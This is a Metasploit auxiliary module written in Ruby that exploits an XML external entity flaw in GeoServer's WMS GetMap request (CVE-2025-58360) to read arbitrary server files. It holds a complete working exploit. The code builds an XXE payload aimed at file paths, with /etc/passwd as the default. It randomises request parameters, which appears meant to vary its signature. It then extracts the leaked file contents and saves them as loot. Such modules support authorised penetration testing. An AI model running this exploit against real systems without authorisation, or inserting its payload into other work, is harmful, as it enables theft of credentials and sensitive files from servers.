##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GeoServer WMS GetMap XXE Arbitrary File Read',
        'Description' => %q{
          This module exploits an XML External Entity (XXE) vulnerability in GeoServer
          via the WMS GetMap operation. The vulnerability allows reading arbitrary files
          from the server's file system by injecting an XXE entity in the SLD (Styled Layer Descriptor).

          Affected versions:
          - GeoServer >= 2.26.0, <= 2.26.1
          - GeoServer <= 2.25.5

          The file content is returned in the error message when the layer name contains
          the XXE entity reference.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'xbow-security',                               # Vulnerability discovery
          'Valentin Lobstein <chocapikk[at]leakix.net>', # Metasploit module
          'Julien Voisin'                                # Randomization suggestions
        ],
        'References' => [
          ['CVE', '2025-58360'],
          ['URL', 'https://github.com/geoserver/geoserver/security/advisories/GHSA-fjf5-xgmq-5525']
        ],
        'DisclosureDate' => '2025-11-25',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to GeoServer', '/geoserver']),
        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd'])
      ]
    )
  end

  def build_xxe_payload(file_path)
    entity_name = Rex::Text.rand_text_alpha_lower(8)
    %(<?xml version="#{rand(2) == 0 ? '1.0' : '1.1'}" encoding="UTF-8"?>
<!DOCTYPE StyledLayerDescriptor [
<!ENTITY #{entity_name} SYSTEM "file://#{file_path}">
]>
<StyledLayerDescriptor version="#{rand(2) == 0 ? '1.0.0' : '1.1.0'}">
<NamedLayer><Name>&#{entity_name};</Name></NamedLayer>
</StyledLayerDescriptor>)
  end

  def build_wms_uri
    min_x = rand(-180.0..180.0).round(2)
    min_y = rand(-90.0..90.0).round(2)
    params = {
      'service' => 'WMS',
      'version' => ['1.0.0', '1.1.1', '1.3.0'].sample,
      'request' => 'GetMap',
      'width' => rand(100..500),
      'height' => rand(100..500),
      'format' => ['image/png', 'image/jpeg', 'image/gif'].sample,
      'bbox' => [min_x, min_y, rand(min_x..180.0).round(2), rand(min_y..90.0).round(2)].join(',')
    }
    "#{normalize_uri(target_uri.path, 'wms')}?#{params.to_a.shuffle.map { |k, v| "#{k}=#{v}" }.join('&')}"
  end

  def extract_file_content(response_body)
    match = response_body.match(%r{Unknown layer:\s*([\s\S]+?)</ServiceException>})
    return nil unless match

    content = match[1]&.strip
    content&.empty? ? nil : content
  end

  def send_xxe_request
    uri = build_wms_uri
    print_status("Sending XXE payload to #{uri}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'ctype' => 'application/xml',
      'data' => build_xxe_payload(datastore['FILEPATH'])
    })

    fail_with(Failure::Unreachable, 'No response from server') unless res
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Server returned unexpected status code: #{res.code}")
    end

    res
  end

  def run
    print_status("Attempting to read file: #{datastore['FILEPATH']}")

    res = send_xxe_request
    file_content = extract_file_content(res.body)

    unless file_content
      return print_error('XXE exploitation failed - file content not found in response')
    end

    print_good("Successfully read file: #{datastore['FILEPATH']}")
    print_line
    print_line(file_content)
    print_line

    print_good("File saved to: #{store_loot(
      'geoserver.file',
      'text/plain',
      datastore['RHOST'],
      file_content,
      File.basename(datastore['FILEPATH']),
      'File read from GeoServer via XXE (CVE-2025-58360)'
    )}")
  end

end
